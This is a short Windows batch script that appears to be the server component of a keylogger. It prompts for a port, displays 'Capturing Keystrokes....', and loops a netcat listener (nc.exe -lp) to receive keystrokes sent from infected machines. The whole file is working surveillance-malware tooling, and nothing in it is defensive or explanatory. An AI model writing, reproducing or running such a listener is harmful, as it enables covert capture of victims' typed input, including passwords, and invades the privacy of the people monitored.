@echo off
cd server
echo.
colorchar /e "Port (Eg:4444): "
set /p port=
:b
timeout /t 03 /NOBREAK >nul
cls
echo.
colorchar /a "Capturing Keystrokes...."
echo.
echo.
colorchar /4 "Press Ctrl + C To Stop "
echo.
echo.
nc.exe -lp %port%
goto b